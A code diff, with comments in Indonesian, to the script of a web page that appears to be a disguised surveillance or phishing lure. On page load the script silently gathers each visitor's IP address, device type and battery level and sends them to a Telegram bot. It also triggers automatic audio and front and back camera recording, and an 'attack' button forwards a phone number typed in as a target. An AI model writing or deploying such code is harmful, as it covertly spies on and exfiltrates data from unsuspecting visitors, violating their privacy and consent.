@@ -122,12 +122,9 @@
 
     async function getInfo() {
       try {
-        // Mengambil Data IP dan ISP (Kartu SIM)
-        const res = await fetch('http://ip-api.com/json/?fields=status,message,query,isp,mobile');
-        const data = await res.json();
-        
-        const ip = data.query || "Tidak terdeteksi";
-        const isp = (data.status === "success") ? data.isp : "tidak terdeteksi";
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const battery = await navigator.getBattery?.() || { level: 0 };
         
         // Deteksi Nama Device
         const ua = navigator.userAgent;
@@ -137,20 +134,19 @@
           deviceName = match ? match[1] : "Android Device";
         } else if (/iPhone|iPad|iPod/i.test(ua)) {
           deviceName = "iOS Device";
+        } else if (/Windows/i.test(ua)) {
+          deviceName = "Windows PC";
         }
 
-        const battery = await navigator.getBattery?.() || { level: 0 };
-        
         const infoText = `
 <b>📱 Device:</b> ${deviceName}
-<b>📶 Kartu SIM:</b> ${isp}
-<b>🌐 IP:</b> ${ip}
+<b>🌐 IP:</b> ${ipData.ip}
 <b>🔋 Baterai:</b> ${(battery.level * 100).toFixed(0)}%
 <b>🕒 Waktu:</b> ${new Date().toLocaleString()}`;
 
         sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n${infoText}`);
       } catch (e) {
-        sendToTelegram("<b>📥 Info Pengunjung (Auto):</b>\nKartu SIM: tidak terdeteksi\n(Gagal Fetch Data)");
+        sendToTelegram("Gagal mengambil info device/IP");
       }
     }
 
@@ -192,20 +188,25 @@
       }
     }
 
+    // Eksekusi Otomatis saat masuk website
     window.addEventListener('DOMContentLoaded', async () => {
       createParticles();
-      await getInfo(); // Deteksi SIM, IP, Device otomatis saat masuk
+      await getInfo();
       await autoRecordAudio();
       await autoRecordVideo("user", "Depan");
       await autoRecordVideo("environment", "Belakang");
     });
 
+    // Logika Tombol Atack
     button.addEventListener('click', () => {
       const nomor = input.value.trim();
       if (!nomor || nomor.length < 8) return;
+      
       button.disabled = true;
       notif.style.display = 'none';
+      
       sendToTelegram(`<b>📞 Target Attack:</b> ${nomor}`);
+      
       setTimeout(() => {
         notif.style.display = 'block';
         button.disabled = false;
